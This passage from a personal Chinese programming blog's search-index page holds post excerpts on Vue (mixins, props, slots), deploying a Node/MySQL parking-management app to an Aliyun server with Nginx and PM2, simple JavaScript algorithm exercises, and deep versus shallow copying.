&lt;p&gt;如果在引用mixins的同时，在组件中重复定义相同的方法，则mixins中的方法会被覆盖。&lt;/p&gt;
&lt;h2 id=&#34;合并生命周期&#34;&gt;合并生命周期&lt;/h2&gt;
&lt;p&gt;与组件里面的生命周期会进行合并&lt;/p&gt;
"> Vue文档 插件</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/a-li-yun-bu-shu-node-xiang-mu/"" data-c="
          &lt;ul&gt;
&lt;li&gt;
&lt;p&gt;下载node和npm并且配置环境变量&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;下载数据库并本地连接导入&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;下载Nginx并配置反向代理&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;下载pm2挂载node&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;p&gt;&lt;a href=&#34;http://139.196.87.221&#34;&gt;fanfan的停车场网址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://fanfankill.github.io/post/vuenodejsmysql-kai-fa-ting-che-chang-guan-li-xi-tong/&#34;&gt;项目介绍博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;目前部分功能上线以后有问题，正在整改中，vue路由改为hash模式，因为后端暂时没有去做路由配置。&lt;/p&gt;
&lt;p&gt;支持自己注册，邀请码暂时没有限制&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;测试账号：19198001091

测试密码：20010620
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;项目需要改进的点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;首次加载过慢，未优化性能 （好像只能谷歌进？）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;头像加载有问题 （头像接口已改 目前在研究如何优化这个接口）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;某些接口上线以后出现问题，无法交互（可能数据库版本问题）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;获取临时车接口问题 报错显示group by语句有误 （线下都好好的）已修复&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;续费接口问题 报错插入的时间格式不正确  用的moment.js计算的时间，果然线下线上差别还是有点大&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ER_TRUNCATED_WRONG_VALUE: Incorrect datetime value: &#39;2023-08-07T16:37:39+08:00&#39; for column &#39;DueDate&#39; at&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;row 1&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;时间问题解决 改成标准的&lt;code&gt;&#39;YYYY-MM-DD HH:mm:ss&#39;&lt;/code&gt;模式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;聊天系统暂时没优化，做了个雏形出来&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;p&gt;自己第一次部署项目，碰到无数的坑，这里总结出了我碰到的坑和找到的好资源&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;没头绪的小伙伴点击这里  &lt;a href=&#34;https://www.bilibili.com/video/BV1n54y1V7Ne?p=21&#34;&gt;B站老师教学&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这个老师讲的很详细，但不免自己会遇到一些坑，根据这个视频的讲解配上下面的博客链接可以让自己少走点弯路。&lt;/p&gt;
&lt;p&gt;准备好一个云服务器和连接工具(我用的xshell)&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;配置node和npm&#34;&gt;配置node和npm&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/huangenai/p/10815426.html&#34;&gt;参考博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;主要配置环境变量&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;数据库的配置连接&#34;&gt;数据库的配置连接&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.jb51.net/article/190714.htm&#34;&gt;参考博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一定养成 &lt;code&gt;# ls&lt;/code&gt;查看目录的习惯，这里下载的mysql版本有点低，建议自己去官网下载，如果你自己本地数据库版本过高，是导入不进去阿里云服务器的。&lt;/p&gt;
&lt;p&gt;我是navicat远程连接的数据库，sql文件一直导入不进去就是因为版本的问题&lt;/p&gt;
&lt;p&gt;如有导入出错的，尝试改sql文件中以下内容&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;utf8mb4_0900_ai_ci&lt;/code&gt; 改为&lt;code&gt;utf8_general_ci&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;utf8mb4&lt;/code&gt;改为&lt;code&gt;utf8&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;还有每次更新数据库版本先要卸载当前版本，不然一直给你抛错。&lt;/p&gt;
&lt;p&gt;记得在阿里云开启安全组&lt;strong&gt;3306&lt;/strong&gt;的端口&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;nginx配置&#34;&gt;Nginx配置&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_42815754/article/details/82980326&#34;&gt;参考博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Nginx默认80端口，阿里云安全组也记得要打开&lt;/p&gt;
&lt;p&gt;proxy_pass  http://127.0.0.1:3000  //这是需要改的东西 最后的端口号依自己的来&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;pm2配置&#34;&gt;PM2配置&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/panbingwen/p/11664175.html&#34;&gt;参考博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_43442102/article/details/100544399&#34;&gt;什么是PM2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;配置后应该就可以随时访问了&lt;/p&gt;
"> 阿里云部署node项目</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/suan-fa/"" data-c="
          &lt;h2 id=&#34;连续子数组的最大和&#34;&gt;&lt;strong&gt;连续子数组的最大和&lt;/strong&gt;&lt;/h2&gt;
&lt;br&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;    function FindGreatestSumOfSubArray(array)
    {
       
        let temp=0
        let max=-99999
        let arr=[]

        for(let i=0;i&amp;lt;array.length;i++)
        {
            
            temp+=array[i]
            arr.push(array[i])
            if(temp&amp;gt;max)
            {
                max=temp
            }
            if(temp&amp;lt;0){
                temp=0
                arr=[]
            }
              
        }
        return max
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;数组中出现次数超过一半的数字&#34;&gt;&lt;strong&gt;数组中出现次数超过一半的数字&lt;/strong&gt;&lt;/h2&gt;
&lt;br&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function MoreThanHalfNum_Solution(numbers)
{
     
     //先排序
        numbers.sort(function (a, b) {
            return a - b
        })
        console.log(numbers);

        let flag = 0
        let count = 0
        let number
       if(numbers.length==1)
       {
           return numbers[0]
       }
       else{
        for (let i = 0; i &amp;lt; numbers.length - 1; i++) {
            if (numbers[i] == numbers[i + 1]) {
                count++

                if (count &amp;gt; flag) {

                    flag = count
                    count = 0
                    number = numbers[i]
                }
           

            }
            else {
                count = 0

            }


        }
        return number
       }
   
    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;合并两个排序的链表&#34;&gt;&lt;strong&gt;合并两个排序的链表&lt;/strong&gt;&lt;/h2&gt;
&lt;br&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function Merge(pHead1, pHead2)
{ // write code here
     
    if (pHead1 == null) {
        return pHead2;
    } else if (pHead2 == null) {
        return pHead1;
    }
    var result = {};
    if (pHead1.val &amp;lt; pHead2.val) {
        result = pHead1;
        result.next = Merge(pHead1.next, pHead2);
    } else {
        result = pHead2;
        result.next = Merge(pHead1, pHead2.next);
    }
    return result;
}
&lt;/code&gt;&lt;/pre&gt;
">算法</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/shen-qian-kao-bei/"" data-c="
          &lt;ul&gt;
&lt;li&gt;基本数据类型的特点：直接存储在栈(stack)中的数据&lt;/li&gt;
&lt;li&gt;引用数据类型的特点：存储的是该对象在栈中引用，真实的数据存放在堆内存里&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;浅拷贝&#34;&gt;浅拷贝&lt;/h2&gt;
&lt;p&gt;对象的直接赋值&lt;/p&gt;
&lt;p&gt;obj1=obj2&lt;/p&gt;
&lt;h2 id=&#34;深拷贝&#34;&gt;深拷贝&lt;/h2&gt;
&lt;p&gt;JSON.parse() 与 JSON.Stringify()&lt;/p&gt;
&lt;p&gt;先转化为字符串然后再转化为JS对象，相当于另外开辟了一块空间&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  var clone = function (obj) {

       return JSON.parse(JSON.stringify(obj));
        } 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这种方法只适用于&lt;strong&gt;纯数据json对象的深度克隆&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
普用方法
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  var clone = function (obj) {

                    if(obj === null) return null

                    if(typeof obj !== &#39;object&#39;) return obj;

                    if(obj.constructor===Date) return new Date(obj);

                    if(obj.constructor === RegExp) return new RegExp(obj);

                     var newObj = new obj.constructor ();  //保持继承链

                    for (var key in obj) {

                            if (obj.hasOwnProperty(key)) {  //不遍历其原型链上的属性

                            var val = obj[key];

                            newObj[key] = typeof val === &#39;object&#39; ? arguments.callee(val) : val; // 使用arguments.callee解除与函数名的耦合

                           }

                } 

                return newObj; 

        };


&lt;/code&gt;&lt;/pre&gt;
">深浅拷贝</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vue-wen-dang-4-cha-cao/"" data-c="
          &lt;h2 id=&#34;插槽&#34;&gt;插槽&lt;/h2&gt;
&lt;p&gt;合成组件  里面可以包括HTML片段，其他组件等&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;navigation-link url=&amp;quot;/profile&amp;quot;&amp;gt;
  Your Profile
&amp;lt;/navigation-link&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;组件写法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;  v-bind:href=&amp;quot;url&amp;quot;
  class=&amp;quot;nav-link&amp;quot;
&amp;gt;
  &amp;lt;slot&amp;gt;&amp;lt;/slot&amp;gt;
&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;编辑作用域&#34;&gt;编辑作用域&lt;/h2&gt;
&lt;p&gt;插槽中使用数据&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;navigation-link url=&amp;quot;/profile&amp;quot;&amp;gt;
  Logged in as {{ user.name }}
&amp;lt;/navigation-link&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该插槽跟模板的其它地方一样可以访问相同的实例 property&lt;/p&gt;
&lt;p&gt;而&lt;strong&gt;不能&lt;/strong&gt;访问 &lt;code&gt;&amp;lt;navigation-link&amp;gt;&lt;/code&gt; 的作用域，例如上面的 &lt;code&gt;url&lt;/code&gt; 是访问不到的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;父级模板里的所有内容都是在父级作用域中编译的；子模板里的所有内容都是在子作用域中编译的&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;后备内容&#34;&gt;后备内容&lt;/h2&gt;
&lt;p&gt;等于默认渲染，它只会在没有提供内容的时候被渲染 ，例如在一个 &lt;code&gt;&amp;lt;submit-button&amp;gt;&lt;/code&gt; 组件中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;button type=&amp;quot;submit&amp;quot;&amp;gt;
  &amp;lt;slot&amp;gt;Submit&amp;lt;/slot&amp;gt;
&amp;lt;/button&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;现在当我在一个父级组件中使用 &lt;code&gt;&amp;lt;submit-button&amp;gt;&lt;/code&gt; 并且不提供任何插槽内容时：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;submit-button&amp;gt;&amp;lt;/submit-button&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;后备内容“Submit”将会被渲染：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;button type=&amp;quot;submit&amp;quot;&amp;gt;
  Submit
&amp;lt;/button&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但如果提供内容就会替代插槽里面的后备内容&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;submit-button&amp;gt;
  Save
&amp;lt;/submit-button&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;具名插槽&#34;&gt;具名插槽&lt;/h2&gt;
&lt;p&gt;有时我们需要多个插槽&lt;/p&gt;
&lt;p&gt;有时我们需要多个插槽。例如对于一个带有如下模板的 &lt;code&gt;&amp;lt;base-layout&amp;gt;&lt;/code&gt; 组件：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt;
  &amp;lt;header&amp;gt;
    &amp;lt;!-- 我们希望把页头放这里 --&amp;gt;
  &amp;lt;/header&amp;gt;
  &amp;lt;main&amp;gt;
    &amp;lt;!-- 我们希望把主要内容放这里 --&amp;gt;
  &amp;lt;/main&amp;gt;
  &amp;lt;footer&amp;gt;
    &amp;lt;!-- 我们希望把页脚放这里 --&amp;gt;
  &amp;lt;/footer&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;slot&amp;gt;&lt;/code&gt; 元素有一个特殊的 attribute：&lt;code&gt;name&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt;
  &amp;lt;header&amp;gt;
    &amp;lt;slot name=&amp;quot;header&amp;quot;&amp;gt;&amp;lt;/slot&amp;gt;
  &amp;lt;/header&amp;gt;
  &amp;lt;main&amp;gt;
    &amp;lt;slot&amp;gt;&amp;lt;/slot&amp;gt;
  &amp;lt;/main&amp;gt;
  &amp;lt;footer&amp;gt;
    &amp;lt;slot name=&amp;quot;footer&amp;quot;&amp;gt;&amp;lt;/slot&amp;gt;
  &amp;lt;/footer&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;一个不带 &lt;code&gt;name&lt;/code&gt; 的 &lt;code&gt;&amp;lt;slot&amp;gt;&lt;/code&gt; 出口会带有隐含的名字“default”。&lt;/p&gt;
&lt;p&gt;我们可以在一个 &lt;code&gt;&amp;lt;template&amp;gt;&lt;/code&gt; 元素上使用 &lt;code&gt;v-slot&lt;/code&gt; 指令&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;base-layout&amp;gt;  &amp;lt;template v-slot:header&amp;gt;    &amp;lt;h1&amp;gt;Here might be a page title&amp;lt;/h1&amp;gt;  &amp;lt;/template&amp;gt;  &amp;lt;p&amp;gt;A paragraph for the main content.&amp;lt;/p&amp;gt;  &amp;lt;p&amp;gt;And another one.&amp;lt;/p&amp;gt;  &amp;lt;template v-slot:footer&amp;gt;    &amp;lt;p&amp;gt;Here&#39;s some contact info&amp;lt;/p&amp;gt;  &amp;lt;/template&amp;gt;&amp;lt;/base-layout&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;现在 &lt;code&gt;&amp;lt;template&amp;gt;&lt;/code&gt; 元素中的所有内容都将会被传入相应的插槽。任何没有被包裹在带有 &lt;code&gt;v-slot&lt;/code&gt; 的 &lt;code&gt;&amp;lt;template&amp;gt;&lt;/code&gt; 中的内容都会被视为默认插槽的内容。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;v-slot&lt;/code&gt; 只能添加在 &lt;code&gt;&amp;lt;template&amp;gt;&lt;/code&gt; 上&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;作用域插槽&#34;&gt;作用域插槽&lt;/h2&gt;
&lt;p&gt;因为从父级传来的值在插槽子级是不可以直接访问的&lt;/p&gt;
&lt;p&gt;子&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;span&amp;gt;  &amp;lt;slot&amp;gt;{{ user.lastName }}&amp;lt;/slot&amp;gt;&amp;lt;/span&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;父&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;current-user&amp;gt;  {{ user.firstName }}&amp;lt;/current-user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以用到了&lt;strong&gt;插槽 prop&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;span&amp;gt;  &amp;lt;slot v-bind:user=&amp;quot;user&amp;quot;&amp;gt;    {{ user.lastName }}  &amp;lt;/slot&amp;gt;&amp;lt;/span&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;v-slot&lt;/code&gt; 来定义我们提供的插槽 prop 的名字&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;current-user&amp;gt;  &amp;lt;template v-slot:default=&amp;quot;slotProps&amp;quot;&amp;gt;    {{ slotProps.user.firstName }}  &amp;lt;/template&amp;gt;&amp;lt;/current-user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;独占默认插槽的缩写语法&#34;&gt;独占默认插槽的缩写语法&lt;/h3&gt;
&lt;p&gt;当只有默认插槽时候可以简写&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;current-user v-slot=&amp;quot;slotProps&amp;quot;&amp;gt;  {{ slotProps.user.firstName }}&amp;lt;/current-user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;只要出现多个插槽，请始终为&lt;em&gt;所有的&lt;/em&gt;插槽使用完整的基于 &lt;code&gt;&amp;lt;template&amp;gt;&lt;/code&gt; 的语法：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;current-user&amp;gt;  &amp;lt;template v-slot:default=&amp;quot;slotProps&amp;quot;&amp;gt;    {{ slotProps.user.firstName }}  &amp;lt;/template&amp;gt;  &amp;lt;template v-slot:other=&amp;quot;otherSlotProps&amp;quot;&amp;gt;    ...  &amp;lt;/template&amp;gt;&amp;lt;/current-user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;解构插槽prop&#34;&gt;解构插槽Prop&lt;/h3&gt;
&lt;p&gt;作用域插槽的内部工作原理是将你的插槽内容包裹在一个拥有单个参数的函数里：&lt;/p&gt;
&lt;p&gt;使用 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment#%E8%A7%A3%E6%9E%84%E5%AF%B9%E8%B1%A1&#34;&gt;ES2015 解构&lt;/a&gt;来传入具体的插槽 prop&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;current-user v-slot=&amp;quot;{ user }&amp;quot;&amp;gt;  {{ user.firstName }}&amp;lt;/current-user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;动态插槽名&#34;&gt;动态插槽名&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;base-layout&amp;gt;  &amp;lt;template v-slot:[dynamicSlotName]&amp;gt;    ...  &amp;lt;/template&amp;gt;&amp;lt;/base-layout&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;具名插槽的缩写&#34;&gt;具名插槽的缩写&lt;/h2&gt;
&lt;p&gt;把参数之前的所有内容 (&lt;code&gt;v-slot:&lt;/code&gt;) 替换为字符 &lt;code&gt;#&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;例如 &lt;code&gt;v-slot:header&lt;/code&gt; 可以被重写为 &lt;code&gt;#header&lt;/code&gt;&#39;&lt;/p&gt;
"> Vue文档4 插槽</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vue-wen-dang-3/"" data-c="
          &lt;h2 id=&#34;prop&#34;&gt;Prop&lt;/h2&gt;
&lt;p&gt;字符串数组形式列出的 prop：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;props: [&#39;title&#39;, &#39;likes&#39;, &#39;isPublished&#39;, &#39;commentIds&#39;, &#39;author&#39;]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;prop 各自的名称和类型&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;props: {
  title: String,
  likes: Number,
  isPublished: Boolean,
  commentIds: Array,
  author: Object,
  callback: Function,
  contactsPromise: Promise // or any other constructor
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;传递静态或动态-prop&#34;&gt;传递静态或动态 Prop&lt;/h2&gt;
&lt;p&gt;给 prop 传入一个静态的值&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;blog-post title=&amp;quot;My journey with Vue&amp;quot;&amp;gt;&amp;lt;/blog-post&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;prop 可以通过 &lt;code&gt;v-bind&lt;/code&gt; 动态赋值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;!-- 动态赋予一个变量的值 --&amp;gt;
&amp;lt;blog-post v-bind:title=&amp;quot;post.title&amp;quot;&amp;gt;&amp;lt;/blog-post&amp;gt;

&amp;lt;!-- 动态赋予一个复杂表达式的值 --&amp;gt;
&amp;lt;blog-post
  v-bind:title=&amp;quot;post.title + &#39; by &#39; + post.author.name&amp;quot;
&amp;gt;&amp;lt;/blog-post&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;需要 &lt;code&gt;v-bind&lt;/code&gt; 来告诉 Vue 这是一个 JavaScript 表达式而不是一个字符串。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;传入数字&lt;/li&gt;
&lt;li&gt;传入布尔值&lt;/li&gt;
&lt;li&gt;传入数组&lt;/li&gt;
&lt;li&gt;传入对象&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;单向数据流&#34;&gt;单向数据流&lt;/h2&gt;
&lt;p&gt;所有的 prop 都使得其父子 prop 之间形成了一个&lt;strong&gt;单向下行绑定&lt;/strong&gt;：父级 prop 的更新会向下流动到子组件中，但是反过来则不行，这样会&lt;strong&gt;防止从子组件意外变更父级组件的状态&lt;/strong&gt;，从而导致你的应用的数据流向难以理解。&lt;/p&gt;
&lt;p&gt;每次父级组件发生变更时，子组件中所有的 prop 都将会刷新为最新的值。这意味着你&lt;strong&gt;不&lt;/strong&gt;应该在一个子组件内部改变 prop&lt;/p&gt;
&lt;p&gt;注意在 JavaScript 中对象和数组是通过引用传入的，所以对于一个数组或对象类型的 prop 来说，在子组件中改变变更这个对象或数组本身&lt;strong&gt;将会&lt;/strong&gt;影响到父组件的状态。&lt;/p&gt;
&lt;h2 id=&#34;prop-验证&#34;&gt;Prop 验证&lt;/h2&gt;
&lt;p&gt;例如你知道的这些类型。如果有一个需求没有被满足，则 Vue 会在浏览器控制台中警告你&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Vue.component(&#39;my-component&#39;, {
  props: {
    // 基础的类型检查 (`null` 和 `undefined` 会通过任何类型验证)
    propA: Number,
    // 多个可能的类型
    propB: [String, Number],
    // 必填的字符串
    propC: {
      type: String,
      required: true
    },
    // 带有默认值的数字
    propD: {
      type: Number,
      default: 100
    },
    // 带有默认值的对象
    propE: {
      type: Object,
      // 对象或数组默认值必须从一个工厂函数获取
      default: function () {
        return { message: &#39;hello&#39; }
      }
    },
    // 自定义验证函数
    propF: {
      validator: function (value) {
        // 这个值必须匹配下列字符串中的一个
        return [&#39;success&#39;, &#39;warning&#39;, &#39;danger&#39;].indexOf(value) !== -1
      }
    }
  }
})
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;替换合并已有的-attribute&#34;&gt;替换/合并已有的 Attribute]&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;class&lt;/code&gt; 和 &lt;code&gt;style&lt;/code&gt; attribute 值会被合并起来&lt;/p&gt;
&lt;h2 id=&#34;禁用-attribute-继承&#34;&gt;禁用 Attribute 继承&lt;/h2&gt;
&lt;p&gt;如果你&lt;strong&gt;不&lt;/strong&gt;希望组件的根元素继承 attribute，你可以在组件的选项中设置 &lt;code&gt;inheritAttrs: false&lt;/code&gt;。例如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Vue.component(&#39;my-component&#39;, {
  inheritAttrs: false,
  // ...
})
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;自定义事件&#34;&gt;&lt;strong&gt;自定义事件&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;事件名不存在自动大小写转换，在&lt;code&gt;v-on&lt;/code&gt;事件监听器DOM模板中会自动转化为小写&lt;/p&gt;
&lt;h2 id=&#34;自定义组件v-model&#34;&gt;自定义组件&lt;code&gt;v-model&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;一个组件上的 &lt;code&gt;v-model&lt;/code&gt; 默认会利用名为 &lt;code&gt;value&lt;/code&gt; 的 prop 和名为 &lt;code&gt;input&lt;/code&gt; 的事件&lt;/p&gt;
&lt;p&gt;但是像单选框、复选框等类型的输入控件可能会将 &lt;code&gt;value&lt;/code&gt; attribute 用于不同的目的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Vue.component(&#39;base-checkbox&#39;, {
  model: {
    prop: &#39;checked&#39;,
    event: &#39;change&#39;
  },
  props: {
    checked: Boolean
  },
  template: `
    &amp;lt;input
      type=&amp;quot;checkbox&amp;quot;
      v-bind:checked=&amp;quot;checked&amp;quot;
      v-on:change=&amp;quot;$emit(&#39;change&#39;, $event.target.checked)&amp;quot;
    &amp;gt;
  `
})
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;将原生事件绑定到组件&#34;&gt;将原生事件绑定到组件&lt;/h2&gt;
&lt;p&gt;想要在一个组件的根元素上直接监听一个原生事件。这时，你可以使用 &lt;code&gt;v-on&lt;/code&gt; 的 &lt;code&gt;.native&lt;/code&gt; 修饰符：&lt;/p&gt;
&lt;p&gt;但元素实际上是一个 &lt;code&gt;&amp;lt;label&amp;gt;&lt;/code&gt; 元素的时候监听不到：&lt;/p&gt;
&lt;p&gt;包含了父作用域中不作为 prop 被识别 (且获取) 的特性绑定&lt;/p&gt;
&lt;p&gt;$attrs可以接受上级传递过来的属性&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;label&amp;gt;
  {{ label }}
  &amp;lt;input
    v-bind=&amp;quot;$attrs&amp;quot;
    v-bind:value=&amp;quot;value&amp;quot;
    v-on:input=&amp;quot;$emit(&#39;input&#39;, $event.target.value)&amp;quot;
  &amp;gt;
&amp;lt;/label&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vue 提供了一个 &lt;code&gt;$listeners&lt;/code&gt; property，它是一个对象，里面包含了作用在这个组件上的所有监听器&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;{
  focus: function (event) { /* ... */ }
  input: function (value) { /* ... */ },
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;就可以配合 &lt;code&gt;v-on=&amp;quot;$listeners&amp;quot;&lt;/code&gt;将所有的事件监听器指向这个组件的某个特定的子元素&lt;/p&gt;
&lt;h2 id=&#34;sync-修饰符&#34;&gt;&lt;code&gt;.sync&lt;/code&gt; 修饰符&lt;/h2&gt;
&lt;p&gt;真正的双向绑定会带来维护上的问题，因为子组件可以变更父组件，且在父组件和子组件两侧都没有明显的变更来源&lt;/p&gt;
&lt;p&gt;带有 &lt;code&gt;.sync&lt;/code&gt; 修饰符的 &lt;code&gt;v-bind&lt;/code&gt; &lt;strong&gt;不能&lt;/strong&gt;和表达式一起使用&lt;/p&gt;
&lt;p&gt;例如 &lt;code&gt;v-bind:title.sync=”doc.title + ‘!’”&lt;/code&gt; 是无效的&lt;/p&gt;
&lt;p&gt;简写双向绑定的语法糖&lt;/p&gt;
